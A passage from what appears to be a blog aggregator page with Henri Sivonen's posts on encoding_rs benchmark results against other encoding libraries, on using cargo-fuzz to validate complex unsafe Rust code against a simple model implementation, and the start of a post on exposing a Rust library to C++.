Turkish, windows-1254</th>
<td>1.65</td>
<td></td>
<td>6.34</td>
<td>5.30</td>
<td>0.80</td>
<td>1.37</td>
<td>1.45</td>
</tr>
<tr>
<th>
Simplified Chinese, gb18030</th>
<td>1.93</td>
<td></td>
<td>6.94</td>
<td>3.22</td>
<td>0.01</td>
<td>0.01</td>
<td>0.01</td>
</tr>
<tr>
<th>
Traditional Chinese, Big5</th>
<td>1.92</td>
<td></td>
<td>5.65</td>
<td>3.65</td>
<td>0.01</td>
<td>0.01</td>
<td>0.02</td>
</tr>
<tr>
<th>
Japanese, EUC-JP</th>
<td>1.86</td>
<td></td>
<td>6.16</td>
<td>3.07</td>
<td>0.02</td>
<td>0.04</td>
<td>0.19</td>
</tr>
<tr>
<th>
Japanese, ISO-2022-JP</th>
<td>1.88</td>
<td></td>
<td>2.95</td>
<td>1.60</td>
<td>0.05</td>
<td>0.04</td>
<td>0.21</td>
</tr>
<tr>
<th>
Japanese, Shift_JIS</th>
<td>1.69</td>
<td></td>
<td>5.21</td>
<td>3.08</td>
<td>0.02</td>
<td>0.04</td>
<td>0.03</td>
</tr>
<tr>
<th>
Korean, EUC-KR</th>
<td>1.98</td>
<td></td>
<td>6.07</td>
<td>3.36</td>
<td>0.30</td>
<td>0.59</td>
<td>0.46</td>
</tr>
<tr>
<th>
x-user-defined</th>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Arabic, UTF-16LE</th>
<td>3.27</td>
<td></td>
<td>4.40</td>
<td>3.50</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Czech, UTF-16LE</th>
<td>3.27</td>
<td></td>
<td>6.03</td>
<td>4.74</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
German, UTF-16LE</th>
<td>3.26</td>
<td></td>
<td>7.75</td>
<td>6.02</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Greek, UTF-16LE</th>
<td>3.26</td>
<td></td>
<td>5.07</td>
<td>3.98</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
English, UTF-16LE</th>
<td>3.24</td>
<td></td>
<td>9.22</td>
<td>7.18</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
French, UTF-16LE</th>
<td>3.22</td>
<td></td>
<td>7.25</td>
<td>5.74</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Hebrew, UTF-16LE</th>
<td>3.26</td>
<td></td>
<td>4.41</td>
<td>3.50</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Portuguese, UTF-16LE</th>
<td>3.29</td>
<td></td>
<td>7.90</td>
<td>6.16</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Russian, UTF-16LE</th>
<td>3.25</td>
<td></td>
<td>4.72</td>
<td>3.73</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Thai, UTF-16LE</th>
<td>3.31</td>
<td></td>
<td>5.77</td>
<td>4.73</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Turkish, UTF-16LE</th>
<td>3.27</td>
<td></td>
<td>5.75</td>
<td>4.55</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Vietnamese, UTF-16LE</th>
<td>3.30</td>
<td></td>
<td>5.11</td>
<td>4.21</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Simplified Chinese, UTF-16LE</th>
<td>3.26</td>
<td></td>
<td>5.79</td>
<td>4.59</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Traditional Chinese, UTF-16LE</th>
<td>3.26</td>
<td></td>
<td>5.78</td>
<td>4.58</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Japanese, UTF-16LE</th>
<td>3.26</td>
<td></td>
<td>5.34</td>
<td>4.24</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Korean, UTF-16LE</th>
<td>3.28</td>
<td></td>
<td>4.90</td>
<td>3.89</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Arabic, UTF-16BE</th>
<td>2.56</td>
<td></td>
<td>3.82</td>
<td>2.83</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Czech, UTF-16BE</th>
<td>2.56</td>
<td></td>
<td>4.94</td>
<td>3.60</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
German, UTF-16BE</th>
<td>2.57</td>
<td></td>
<td>6.38</td>
<td>4.64</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Greek, UTF-16BE</th>
<td>2.57</td>
<td></td>
<td>4.40</td>
<td>3.21</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
English, UTF-16BE</th>
<td>2.56</td>
<td></td>
<td>7.47</td>
<td>5.48</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
French, UTF-16BE</th>
<td>2.51</td>
<td></td>
<td>5.82</td>
<td>4.36</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Hebrew, UTF-16BE</th>
<td>2.57</td>
<td></td>
<td>3.82</td>
<td>2.82</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Portuguese, UTF-16BE</th>
<td>2.54</td>
<td></td>
<td>6.42</td>
<td>4.64</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Russian, UTF-16BE</th>
<td>2.58</td>
<td></td>
<td>4.09</td>
<td>3.01</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Thai, UTF-16BE</th>
<td>2.63</td>
<td></td>
<td>4.97</td>
<td>3.81</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Turkish, UTF-16BE</th>
<td>2.56</td>
<td></td>
<td>4.71</td>
<td>3.44</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Vietnamese, UTF-16BE</th>
<td>2.59</td>
<td></td>
<td>4.18</td>
<td>3.14</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Simplified Chinese, UTF-16BE</th>
<td>2.56</td>
<td></td>
<td>4.92</td>
<td>3.64</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Traditional Chinese, UTF-16BE</th>
<td>2.56</td>
<td></td>
<td>4.93</td>
<td>3.63</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Japanese, UTF-16BE</th>
<td>2.57</td>
<td></td>
<td>4.61</td>
<td>3.43</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<th>
Korean, UTF-16BE</th>
<td>2.57</td>
<td></td>
<td>4.17</td>
<td>3.06</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>

<h4>Notable Observations</h4>

<p>Rather expectedly, for ASCII on x86_64, SIMD is a lot faster than not using SIMD and encode to legacy encodings without encode-oriented data tables is <i>relatively</i> slow (but, again, still user-perceptibly fast enough even on low-end hardware for the form submission use case for legacy encoders in a Web browser). Also, the na√Øve the code structure that remains in the ISO-2022-JP decoder is slower than the kind of code structure that uses the program counter as part of the two-byte state tracking leading to more predictable branches.

</p><h5>glibc</h5>

<p>Unlike the other libraries that convert to UTF-16 or UTF-8, glibc supports conversions from any encoding into any other by pivoting via UTF-32 on a per scalar value basis. This generality has a cost. I think the main take-away for application developers is that a standard library implementation covers a lot of functionality and not all those areas are optimized, so you should not assume that a library is fast at everything just because it is a core system library that has been around for a long time.

</p><p>As noted earlier, in the ‚ÄúApples to Oranges Comparisons‚Äù, when encoding from UTF-8, glibc treats the input as potentially invalid, but encoding_rs assumes validity, so when encoding from UTF-8 to UTF-8, the encoding_rs numbers are basically for <code>memcpy</code> but glibc inspects everything.

</p><h5>kernel32</h5>

<p>In contrast, the Windows system converters have been seriously optimized for the encodings that are the default ‚ÄúANSI code page‚Äù for some Windows locale. Notably, this benchmark tested gb18030 (not default system code page for any locale) and not GBK (the default for Simplified Chinese), and gb18030 looks relatively slower than the code pages that are the default in some locale configuration of Windows. EUC-JP, however, looks well optimized in kernel32 despite it not being the default for any locale.

</p><p>On the decode side, kernel32 is faster than encoding_rs for single-byte encodings for non-Latin scripts that use ASCII punctuation and spaces. However, for Thai and Latin scripts, encoding_rs is faster than kernel32 for single-byte encodings. This shows the cost of ASCII-acceleration when bouncing back to ASCII only for one or two bytes at a time and shows the downside of trying to limit the code footprint of encoding_rs by using the same code for all single-byte encodings with only the lookup table as a configurable variable.

</p><p>On the encode side, kernel32 is<i>extremely</i> fast relative to other implementations for the encodings that are the default ‚ÄúANSI code page‚Äù for some Windows locale (and for EUC-JP). Windows is not Open Source, so I haven‚Äôt seen the code, but from the performance characteristics it looks like kernel32 has a lookup table that can be directly indexed by a 16-bit Basic Multilingual Plane code point and that yields a pair of bytes that can be copied directly to output. In microbenchmarks that don‚Äôt involve SIMD-acceleratable ASCII runs, it‚Äôs basically impossible to do better. It is hard to know what the cache effects of a maximally large lookup table are outside microbenchmarks, but the lookup table footprint just for CJK Unified Ideographs or just for Hangul Syllables is a large number of cache lines anyway.

</p><p>Considering the use cases for the kernel32 converters, optimizing for extreme speed rather than small footprint makes sense. When pre-Unicode legacy apps are run on Windows, all calls to systems APIs that involve strings convert between the application-side ‚ÄúANSI code page‚Äù and the system-side UTF-16. Typically, all apps run with the same legacy ‚ÄúANSI code page‚Äù, so only the lookup table for one encoding needs to be actively accessed.

</p><p>If the mission of the legacy encoders in encoding_rs was to provide maximally fast conversion to legacy encodings as opposed to providing correct conversion to legacy encodings with minimal footprint and just enough speed for the user not to complain about form submission, it would totally make sense to use tables directly indexably by 16-bit Basic Multilingual Plane code point.

</p><h5>uconv</h5>

<p>Overall, performance-wise the rewrite was an improvement. (More about UTF-16 to UTF-8 encode below.) As far as I can tell, the EUC-KR results for uconv are not a benchmark environment glitch but the EUC-KR implementation in uconv was just remarkably inefficient. The Big5 results say nothing about the original design of uconv. The uconv Big5 implementation being compared with in the one I wrote for Firefox 43, and that implementation already did away with encode-oriented data tables.

</p><p>In encoding_rs, the ISO-2022-JP decoder uses a state variable while uconv was a bit faster thanks to using the program counter for state.

</p><h5>rust-encoding</h5>

<p>As noted earlier in the ‚ÄúApples to Oranges Comparisons‚Äù section, the numbers to and from UTF-8 show how much better borrowing is compared to copying when borrowing is possible. That is, encoding_rs borrows and rust-encoding copies.

</p><h5>ICU</h5>

<p>ICU is an immensely useful and important library, but I am somewhat worried about the mentality that everyone should just standardize on ICU, and that no one can afford to rewrite ICU. In particular, I‚Äôm worried about the ‚Äújust use ICU‚Äù approach entrenching UTF-16 as an in-memory representation of Unicode <i>even more</i> at a time when it‚Äôs <a href="https://forums.swift.org/t/string-s-abi-and-utf-8/17676">increasingly clear</a> that UTF-8 should be used not only as the interchange representation but also as the in-memory representation of Unicode. I hope the x86_64 and aarch64 results here encourage others to try to do better than ICU, (piece-wise, as the Rust ecosystem is doing) instead of just settling on ICU.

</p><p>On ARMv7, encoding_rs performs worse than ICU for decoding non-windows-1252 single-byte encodings into UTF-16. This shows how encoding_rs‚Äôs design relies heavily on SIMD. ARMv7 has weaker SIMD functionality than x86, x86_64 or aarch64, so the split between ASCII and non-ASCII is a pessimization on ARMv7. In the x86_64 case the benefits of SSE2 for markup offset the downsides of the ASCII/non-ASCII handling split for natural language in the Wikipedia case. Fortunately, mobile browsing skews even more towards UTF-8 than the Web in general, migration from the affected encodings to UTF-8 is, anecdotally, even further along than migration to UTF-8 in general, and aarch64 is around the corner, so I think it isn‚Äôt worthwhile to invest effort or binary footprint into having a different design for ARMv7.

</p><h5>Encode from UTF-16 to UTF-8</h5>

<p>While encoding_rs is a lot faster than the other libraries when encoding ASCII or almost-ASCII from UTF-16 to UTF-8, encoding_rs does worse than uconv, kernel32 and ICU in cases where there is only short runs of ASCII, typically one ASCII space, mixed with non-ASCII. This is consistent for the Arabic, Greek, Hebrew and Russian but relative to kernel32this shows up also for Korean and for the Latin script‚Äînot just for Vietnamese (with which the effect also shows up relative to uconv), Turkish and Czech that whose non-ASCII frequency is obviously high but even for French.</p>

<p>This shows that the cost of swiching between the ASCII fast path and the non-ASCII mode is higher for UTF-16 input than for single-byte input, which makes sense, since checking whether a SIMD vector of 16-bit units is in the Basic Latin range requires more SSE2 operations that checking a vector of 8-bit units. Considering that the benefit of the ASCII fast path is so large in the ASCII case, I ended up keeping the ASCII fast path, despite it being a pessimization, though, fortunately, not a huge one, for many languages.

</p><h5>Single-Byte Encode</h5>

<p>Arabic, Hebrew, Greek and Russian are all written in non-Latin scripts that use ASCII spaces and punctuation. Why does Arabic encode perform so much worse? The reason is that the trick of identifying a contiguous dominant range of code points that maps by offset is not as good a fit for windows-1256 as it is for windows-1251, windows-1252, windows-1253, and windows-1255. While there is a range of Arabic characters that is contiguous in both Unicode and in <a href="https://encoding.spec.whatwg.org/windows-1256.html">windows-1256</a>, some characters are not in that range. In contrast, all Hebrew consonants (the test data is not vocalized) map by offset between Unicode and <a href="https://encoding.spec.whatwg.org/windows-1255.html">windows-1255</a>. The Cyrillic letters needed for Russian are likewise mappable by offset between Unicode and <a href="https://encoding.spec.whatwg.org/windows-1251.html">windows-1251</a> as are Greek lower-case letters (and some upper case ones) in <a href="https://encoding.spec.whatwg.org/windows-1253.html">windows-1253</a>. Of course, the bulk of <a href="https://encoding.spec.whatwg.org/windows-1252.html">windows-1252</a> maps by offset.

</p><p>The approach of offsetting one range does not work at all for <a href="https://encoding.spec.whatwg.org/windows-1250.html">windows-1250</a>.

</p><p>Considering how for Web browser use cases even the <i>relatively</i> extremely slow speed of legacy CJK encode is fast enough, non-ASCII single-byte encode is fast enough for Web browser use cases even when the approach of offsetting a range does not work. The offset approach is just a very small-footprint tweak that is a nice bonus when it does work.

</p><h5>The Rust Standard Library</h5>

<p>UTF-8 validation in the Rust standard library is very fast. It took quite a bit of effort to do better. (I hope that the code from encoding_rs gets upstreamed to the standard library eventually.) I managed to make encoding_rs faster than the standard library for input that‚Äôs not 100% ASCII first, but even when encoding_rs was faster than the standard library for English Wikipedia, the standard library was still faster for 100% ASCII. To make encoding_rs faster even in that case, it was necessary to introduce a two-tier approach even to the ASCII fast path. Assuming that the input is long enough to use SIMD at all, first the ASCII fast path processes 16 bytes as an unalinged SSE2 read. If that finds non-ASCII, the cost of having bounced to the SIMD path is still modest. If the first 16 bytes are ASCII, the fast path enters an ever faster path that uses aligned reads and unrolls the loop by two.

</p><p>The data cache footprint of the UTF-8 validation function in the Rust standard library is 256 bytes or four cache lines. The data cache footprint of encoding_rs‚Äôs UTF-8 validation function is 384 bytes or six cache lines, so 50% more. Using a lookup table to speed up a function that in principle should be doing just simple bit manipulation is a bit questionable, because benchmarks show behavior where the cost of bringing the lookup table to the cache is amortized across the benchmark iterations and the application-context cost of having to evict something else is not visible. For long inputs containing non-ASCII, using a lookup table is clearly justified. The effects on handling short strings as part of a larger system are unclear. As we‚Äôve learned from Spectre, we shouldn‚Äôt assume that the 100% ASCII case avoids bringing the lookup table into the data cache.

</p><h5>WebKit</h5>

<p>What bothers me the most about the benchmark results is that WebKit‚Äôs UTF-8 to UTF-16 decoder is faster than encoding_rs‚Äôs for the 100% ASCII case. That encoding_rs is faster for English Wikipedia content shows how specialized the WebKit win is. Closing the gap did not succeed using the same approach that worked in the case of closing the UTF-8 validation performance gap with the Rust standard library (which involved only reads, while decoding to UTF-16 involves writes, too). I don‚Äôt want to sacrifice encoding_rs‚Äôs performance in the case where the input isn‚Äôt 100% ASCII. The obvious solution would be to introduce very ASCII-biased prefix handling and moving to the current more balanced (between ASCII and non-ASCII) encoding_rs code when the first non-ASCII byte is seen. However, I don‚Äôt want to introduce a performance cliff like that. Consider a single copyright sign in a license header at the top of an otherwise ASCII file. For a long file, a good implementation should be able to climb back to the fast path after the copyright sign. As a consolation, the 100% ASCII case matters the most for CSS and JavaScript. In Gecko, the CSS case already uses UTF-8 validation instead of UTF-8 to UTF-16 conversion and JavaScript is on track to moving from UTF-8 to UTF-16 conversion to UTF-8 validation.

</p><p>Interestingly, WebKit‚Äôs ASCII fast path is written as ALU code. I didn‚Äôt bother trying to locate the right disassembly, but if the performance is any indication, GCC must be unrolling and autovectrorizing WebKit‚Äôs ASCII fast path.

</p><h5>kewb</h5>

<p>Bob Steagall‚Äôs UTF-8 to UTF-16 decoder that combines SSE2 with a Deterministic Finite Automaton (DFA) is remarkably fast. While encoding_rs is a bit faster for Latin script with very infrequent non-ASCII (the threshold is between German and Portuguese) and for writing that doesn‚Äôt use use ASCII spaces (Thai, Chinese, and Japanese), the DFA is faster for everything that involves more frequent transitions between ASCII and non-ASCII. I haven‚Äôt studied properly how the implementation manages the transitions between SSE2 and the DFA, but the result is awesome.

</p><p>Compared to encoding_rs‚Äôs lookup table of 384 bytes or six cache lines, the DFA has a larger data cache footprint: the presentation slides say 896 bytes or 14 cache lines. As noted earlier, in the benchmarks the cost of bringing the tables into the cache are amortized across benchmark iterations and the cost of having to evict something else in a real-world application is not visible in a benchmark. Considering that <code>encoding_rs::mem</code> (discussed below) reuses encoding_rs‚Äôs UTF-8 to UTF-16 decoder for potentially short strings, I‚Äôm reluctant to adopt the DFA design that could have adverse cache effects in an application context.

</p><h3>One More Thing: <code>encoding_rs::mem</code></h3>

<p>The above discussion has been about encoding_rs in its role for converting between external encodings and the application-internal Unicode representation(s). That kind of usage calls for a well-designed streaming API when incremental processing of HTML (and XML) is one of the use cases. However, if an application that has, for legacy reasons, multiple application-internal representations, converting between those generally calls less for streaming generality and more for API simplicity.

</p><p>A Rust application written from scratch could do well with just one application-internal Unicode representation: UTF-8. However, Gecko, JavaScript, and the DOM API were created at the time when it was believed that Unicode was a 16-bit code space and that the application-internal Unicode representation should consist of 16-bit units. In the same era, Java, Windows NT, and Qt, among others, committed to 16-bit units in their internal Unicode representations.

</p><p>With the benefit of hindsight, we can now say that it was a mistake to commit to 16-bit units in the application-internal Unicode representation. At the upper end of the code space, it became clear that 16 bits weren‚Äôt enough and Unicode was extended to 21 bits, so UTF-16 with surrogates was introduced making a memory representation consisting of 16-bits units variable-width representation anyway (even without considering grapheme clusters). At the lower end of the code space, it became clear that the ASCII range remains quite a bit more overrepresented than one might have expected by looking at the natural language is used around the world: Various textual computer syntaxes tend to use ASCII. In the context of Gecko, the syntax of HTML, XML, CSS and JavaScript is ASCII.

</p><p>To cope with these realities, Gecko now uses UTF-8 internally for some things and in some cases tries to store semantically UTF-16 data without the higher half of each code unit‚Äîi.e. storing data as Latin1 if possible. In Gecko, this approach is used for JavaScript strings and DOM text nodes. (This approach isn‚Äôt unique to Gecko. It is also used in V8, optionally in HotSpot and, with Latin1, UCS-2 and UTF-32 levels, in Python 3. <a href="https://forums.swift.org/t/string-s-abi-and-utf-8/17676">Swift is moving away from a similar dual model to UTF-8.</a>) When adding to the mix that  Rust code is confident about UTF-8 validity  but C++ isn‚Äôt, Gecko ends up with four kinds of internal text representations:

</p><ul>
<li>UTF-16 whose validity cannot be trusted
</li><li>Latin1 that cannot be invalid
</li><li>UTF-8 whose validity cannot be fully trusted
</li><li>UTF-8 whose validity can be fully trusted
</li></ul>

<p><code>encoding_rs::mem</code> provides efficient conversions between these four cases as well as functionality for checking if UTF-16 or UTF-8 only contains code points in the Latin1 range. Furthermore, the module also is able to check if text for sure does not contain any right-to-left text. While this check seems to be out of place in this module, it makes sense to combine this check with a Latin1ness check when creating DOM text nodes. Also, it makes sense to optimize the check using portable SIMD. (In Gecko, documents start their life as left-to-right-only. As long as they stay that way, the Unicode Bidirectional Algorithm can be optimized out in layout. However, whenever text is added to the document, it needs to be inspected to see if it might contain right-to-left characters. Once at least one such character is encountered, the document transitions into the bidi mode and the Unicode Bidirectional Algorithm is used in layout from then on.)

</p><p>Notably, the use case of converting in-memory text is different from converting incrementally-parsed HTML or XML. Instead of providing streaming conversion, <code>encoding_rs::mem</code> provides conversions in a non-streaming manner, which enables a simpler API. In most cases, the caller is supposed to allocate the target buffer according to the maximum possible length requirement. As an exception, conversions to UTF-8 can be performed in multiple steps in order to avoid excessive allocation, considering that the maximum possible length requirement when converting from UTF-16 to UTF-8 is three times the minimum possible case. The general assumption is that when converting from UTF-16 to UTF-8, first this buffer is sized according to the minimum possible case and rounded up to the allocator bucket and if the result doesn‚Äôt fit, then the maximum possible case is tried. When converting XPCOM strings, though, there‚Äôs an additional heuristic that looks at the first two cache lines of the UTF-16 buffer in order to make a guess whether the initial allocation should be larger than the minimum possible size.

</p><p>Since Gecko uses an allocator with power-of-two buckets, is not worthwhile to compute the buffer size requirements precisely. Being a bit wrong still often ends up in the same allocator bucket. Indeed, the new code that makes guesses and occasionally reallocates is generally faster than the old code that tried to compute the buffer size requirements precisely and ended up doing UTF math twice in the process.

</p><p>The code for <code>encoding_rs::mem</code> looks rather unreviewable. It is that way due performance reasons. The messy look arisis from SIMD with raw pointers, manual alignment handling and manual loop unrolling. To convince myself and others that the code does what it is supposed to do, I created <a href="https://github.com/hsivonen/safe_encoding_rs_mem">another implementation</a> of the same API in the simplest way possible using the Rust standard library facilities. Then I benchmarked the two to verify that my complicated code indeed was faster. Then I <a href="http://hsivonen.iki.fi/cargo-fuzz/">used cargo-fuzz to pass the same fuzzing input to both implementations</a> and seeing that their output agrees (and that there a no panics or Address Sanitizer-reported problems).

</p><p>This description of <code>encoding_rs::mem</code> looks thematically quite different from the earlier discussion of encoding_rs proper. Indeed, as far as API usage goes, <code>encoding_rs::mem</code> should be a separate crate. The only reason why it is a submodule is that the two share implementation details that don‚Äôt make sense to expose as a third crate with the public API. Users of encoding_rs that don‚Äôt need <code>encoding_rs::mem</code> should simply ignore the submodule and let link-time optimization discard it.

</p><p>The combination of encoding_rs‚Äôs faster converter internals with the new allocation strategy that is a better fit for Gecko‚Äôs memory allocator was a clear performance win. My hope is that going forward conversion between UTF-8 and UTF-16 will be perceived as having acceptable enough a cost that Gecko developers will feel more comfortable with components that use UTF-8 internally even if it means that a conversion has to happen on a component boundary. On the other hand, I‚Äôm hoping to use this code to speed up a case where there already is a boundary even though the boundary is easy to forget: The WebIDL boundary between JavaScript and C++. Currently, when SpiderMonkey has a Latin1 string, it is expanded to UTF-16 at the DOM boundary, so e.g. using <code>TextEncoder</code> to encode an ASCII JavaScript string to UTF-8 involves expanding the string to UTF-16 and then encoding from UTF-16 to UTF-8 when just copying the bytes over should be logically possible.

</p></div></div><div class="permalink"><a href="https://hsivonen.fi/encoding_rs/">by Henri Sivonen at <time datetime="2018-12-03T10:30:12Z" title="December 03, 2018 10:30 AM GMT">‰∏ãÂçà6:30:12</time></a></div></div><div class="news henri-sivonen"><a id="news-53"></a><h3><a href="https://hsivonen.fi/" title="Henri Sivonen‚Äôs pages (Mozilla-only edition)">Henri Sivonen</a> ‚Äî <a href="https://hsivonen.fi/cargo-fuzz/">Using cargo-fuzz to Transfer Code Review of Simple Safe Code to Complex Code that Uses unsafe</a></h3><div class="entry"><div class="content"><p><a href="https://docs.rs/encoding_rs/0.8.13/encoding_rs/mem/"><code>encoding_rs::mem</code></a> is a Rust module for performing conversions between different in-RAM text representations that are relevant to Gecko. Specifically, it converts between potentially invalid UTF-16, Latin1 (in the sense that unsigned byte value equals the Unicode scalar value), potentially invalid UTF-8, and guaranteed-valid UTF-8, and provides some operations on buffers in these encodings, such as checking if a UTF-16 or UTF-8 buffer only has code points in the ASCII range or only has code points in the Latin1 range. (You can read <a href="http://hsivonen.iki.fi/encoding_rs/#mem">more about <code>encoding_rs::mem</code></a> in a <a href="http://hsivonen.iki.fi/encoding_rs/">write-up about encoding_rs as a whole</a>.)

</p><p>The whole point of this module is to make things very fast using Rust‚Äôs (not-yet-stable) portable SIMD features. The code was written before slices in the standard library had the <a href="https://doc.rust-lang.org/nightly/std/primitive.slice.html#method.align_to"><code>align_to</code></a> method or the <a href="https://doc.rust-lang.org/nightly/std/primitive.slice.html#method.chunks_exact"><code>chunks_exact</code></a> method. Moreover, to get speed competitive with the instruction set-specific and manually loop-unrolled C++ code that the Rust code replaced, some loop unrolling is necessary, but Rust <a href="https://github.com/rust-lang/rfcs/issues/2219">does not yet support</a> directives for the compiler that would allow the programmer to request specific loop unrolling from the compiler.

</p><p>As a result, the code is a relatively unreviewable combination of manual alignment calculations, manual loop unrolling and manual raw pointer handling. This indeed achieves high speed, but by looking at the code, it isn‚Äôt at all clear whether the code is actually safe or otherwise correct.

</p><p>To validate the correctness of the rather unreviewable code, I used <a href="https://en.wikipedia.org/wiki/Model-based_testing">model-based testing</a> with <a href="https://github.com/rust-fuzz/cargo-fuzz">cargo-fuzz</a>. cargo-fuzz provides Rust integration for LLVM‚Äôs <a href="https://llvm.org/docs/LibFuzzer.html">libFuzzer</a> coverage-guided fuzzer. That is, the fuzzer varies the inputs it tries based on observing how the inputs affect the branches taken inside the code being fuzzed. The fuzzer runs with one of LLVM‚Äôs sanitizers enabled. By default, the Address Sanitizer (ASAN) is used. (Even though the sanitizers should never find bugs in safe Rust code, the sanitizers are relevant to bugs in Rust code that uses <code>unsafe</code>.)

</p><p>I wrote a <a href="https://github.com/hsivonen/safe_encoding_rs_mem/">second implementation</a> (the ‚Äúmodel‚Äù) of the same API in the most obvious way possible using Rust standard-library facilities and without <code>unsafe</code>, except where required to be able to write into an <code>&amp;mut str</code>. I also used the second implementation to validate the speed of the complex implementation. Obviously, there‚Äôd be no point in having a complex implementation if it wasn‚Äôt faster than the simple and obvious one. (The complex implementation is, indeed, faster.)

</p><p>For example, the function for checking if a buffer of potentially invalid UTF-16 only contains characters in the Latin1 range is <a href="https://github.com/hsivonen/safe_encoding_rs_mem/blob/fd8509abf77864583c812ffab434d0fd2183bc4c/src/lib.rs#L97-L104">8 lines</a> (including the function name and the closing brace) in the safe version. In the fast version, it‚Äôs <a href="https://github.com/hsivonen/encoding_rs/blob/26061feded8afda1ae0821ce1a9de7ab3d6dd982/src/mem.rs#L670-L672">3 lines</a> that just call to <a href="https://github.com/hsivonen/encoding_rs/blob/26061feded8afda1ae0821ce1a9de7ab3d6dd982/src/mem.rs#L235">another function expanded from a macro</a>, where the expansion is either generated using either a <a href="https://github.com/hsivonen/encoding_rs/blob/26061feded8afda1ae0821ce1a9de7ab3d6dd982/src/mem.rs#L146-L221">76-line SIMD-using macro</a> or a <a href="https://github.com/hsivonen/encoding_rs/blob/26061feded8afda1ae0821ce1a9de7ab3d6dd982/src/mem.rs#L73-L143">71-line ALU-using macro</a> depending on whether the code was compiled with SIMD enabled. Of these macros, the SIMD calls another (tiny) function that has a <a href="https://github.com/hsivonen/encoding_rs/blob/26061feded8afda1ae0821ce1a9de7ab3d6dd982/src/simd_funcs.rs#L193-L197">specialized implementation for aarch64</a> and a <a href="https://github.com/hsivonen/encoding_rs/blob/26061feded8afda1ae0821ce1a9de7ab3d6dd982/src/simd_funcs.rs#L206-L212">portable implementation</a>.

</p><p>To use cargo-fuzz, you create a ‚Äú<a href="https://github.com/hsivonen/encoding_rs/blob/26061feded8afda1ae0821ce1a9de7ab3d6dd982/fuzz/fuzzers/fuzz_mem.rs">fuzzer script</a>‚Äù, which is a Rust function that gets a slice of bytes from the fuzzer and exercises the code being fuzzed. In the case of fuzzing <code>encoding_rs::mem</code>, the first byte  is used  to <a href="https://github.com/hsivonen/encoding_rs/blob/26061feded8afda1ae0821ce1a9de7ab3d6dd982/fuzz/fuzzers/fuzz_mem.rs#L303-L329">decide</a> which function to exercise and the  rest of the slice is used as the input to the function. When the function being called takes a slice of <code>u16</code>, a <a href="https://github.com/hsivonen/encoding_rs/blob/26061feded8afda1ae0821ce1a9de7ab3d6dd982/fuzz/fuzzers/fuzz_mem.rs#L39-L44">suitably aligned <code>u16</code> subslice of the input is taken</a>.

</p><p>For each function, the fuzzer script <a href="https://github.com/hsivonen/encoding_rs/blob/26061feded8afda1ae0821ce1a9de7ab3d6dd982/fuzz/fuzzers/fuzz_mem.rs#L94-L96">calls both the complex implementation and the corresponding simple implementation with the same input and checks that the outputs match</a>. The fuzzer finds a bug if the outputs don‚Äôt match, if there is a panic, or if the LLVM Address Sanitizer notices bad memory access, which could arise from the use of <code>unsafe</code>.

</p><p>Once the fuzzer fails to find problems after having run for a few days, we can have high confidence that the complex implementation is correct in the sense that its observable behavior, ignoring speed, matches the observable behavior of the simple implementation. Therefore,  a code review for the correctness of the simple implementation can, with high confidence, be considered to apply to the complex implementation as well.

</p></div></div><div class="permalink"><a href="https://hsivonen.fi/cargo-fuzz/">by Henri Sivonen at <time datetime="2018-12-03T09:42:34Z" title="December 03, 2018 09:42 AM GMT">‰∏ãÂçà5:42:34</time></a></div></div><div class="news henri-sivonen"><a id="news-54"></a><h3><a href="https://hsivonen.fi/" title="Henri Sivonen‚Äôs pages (Mozilla-only edition)">Henri Sivonen</a> ‚Äî <a href="https://hsivonen.fi/modern-cpp-in-rust/">How I Wrote a Modern C++ Library in Rust</a></h3><div class="entry"><div class="content"><p>Since version 56, Firefox has had a new character encoding conversion library called encoding_rs. It is written in Rust and replaced the old C++ character encoding conversion library called uconv that dated from early 1999. Initially, all the callers of the character encoding conversion library were C++ code, so the new library, despite being written in Rust, needed to feel usable when used from C++ code. In fact, the library appears to C++ callers as a modern C++ library. Here are the patterns that I used to accomplish that.

</p><p>(There is <a href="http://hsivonen.iki.fi/encoding_rs/">another write-up about encoding_rs itself</a>. I presented most of the content in <i>this</i> write-up in my talk at RustFest Paris: <a href="https://media.ccc.de/v/rustfest18-5-a_rust_crate_that_also_quacks_like_a_modern_c_library">video</a>, <a href="https://hsivonen.fi/rustfest2018/">slides</a>.)

</p><h3>Modern C++ in What Way?</h3>

